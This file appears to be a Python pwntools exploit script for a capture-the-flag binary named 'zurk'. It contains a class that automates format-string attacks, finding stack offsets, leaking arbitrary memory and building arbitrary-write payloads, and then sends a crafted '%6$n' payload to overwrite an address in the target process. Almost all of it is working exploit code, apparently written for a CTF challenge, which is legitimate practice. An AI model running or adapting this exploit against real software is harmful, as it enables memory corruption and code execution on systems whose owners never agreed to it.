from pwn import *
from IPython import embed


class FmtStrr(object):
    """
    Provides an automated format string exploitation.

    It takes a function which is called every time the automated
    process want to communicate with the vulnerable process. this
    function takes a parameter with the payload that you have to
    send to the vulnerable process and must return the process
    returns.

    If the `offset` parameter is not given, then try to find the right
    offset by leaking stack data.

    Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes

    """

    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0):
        """
        Instantiates an object which try to automating exploit the vulnerable process

        Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes
        """
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten

        if self.offset == None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

    def leak_stack(self, offset, prefix=""):
        leak = self.execute_fmt(str(prefix) + "START%{}$pEND".format(offset))
        try:
            leak = re.findall(r"START(.*)END", str(leak), re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak

    def find_offset(self):
        marker = cyclic(20)
        for off in range(1, 1000):
            leak = self.leak_stack(off, marker)
            log.info("%x" % leak)
            leak = p64(leak)

            pad = cyclic_find(leak)
            if pad >= 0 and pad < 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None

    def _leaker(self, addr):
        # Hack: elfheaders often start at offset 0 in a page,
        # but we often can't leak addresses containing null bytes,
        # and the page below elfheaders is often not mapped.
        # Thus the solution to this problem is to check if the next 3 bytes are
        # "ELF" and if so we lie and leak "\x7f"
        # unless it is leaked otherwise.
        if addr & 0xFFF == 0 and self.leaker._leak(addr + 1, 3, False) == "ELF":
            return "\x7f"

        fmtstr = randoms(self.padlen) + pack(addr) + "START%%%d$sEND" % self.offset

        leak = self.execute_fmt(fmtstr)
        leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]

        leak += "\x00"

        return leak

    def execute_writes(self):
        """execute_writes() -> None

        Makes payload and send it to the vulnerable process

        Returns:
            None

        """
        fmtstr = randoms(self.padlen)
        fmtstr += str(
            fmtstr_payload(
                self.offset, self.writes, numbwritten=self.padlen, write_size="byte"
            )
        )
        self.execute_fmt(fmtstr)
        self.writes = {}

    def write(self, addr, data):
        r"""write(addr, data) -> None

        In order to tell : I want to write ``data`` at ``addr``.

        Arguments:
            addr(int): the address where you want to write
            data(int): the data that you want to write ``addr``

        Returns:
            None

        Examples:

            >>> def send_fmt_payload(payload):
            ...     print repr(payload)
            ...
            >>> f = FmtStr(send_fmt_payload, offset=5)
            >>> f.write(0x08040506, 0x1337babe)
            >>> f.execute_writes()
            '\x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08%174c%5$hhn%252c%6$hhn%125c%7$hhn%220c%8$hhn'

        """
        self.writes[addr] = data


libc = ELF("./libc-2.23.so")
env = {"LD_PRELOAD": libc.path}
p = process("./zurk", env=env)
# p = remote("binary.utctf.live", 9003)
# p = remote("0.0.0.0", 9998)

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"


libc_puts = libc.symbols["puts"]
print (libc_puts)

# Function called in order to send a payload
def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    # p.recvuntil("do?\n")
    p.sendline(payload)
    return p.recv()


# gdb.attach(p)

raw_input()

# Create a FmtStr object and give to him the function
# format_string = FmtStrr(execute_fmt=send_payload)
# format_string.write(0x601018, 0x0)
# format_string.execute_writes()

payload = "\x18\x10\x60\x00\x00\x00\x00\x00"
payload += "%6$n"

p.recvuntil("do?\n")
p.sendline(payload)

print p.clean(1)

# embed()
raw_input()
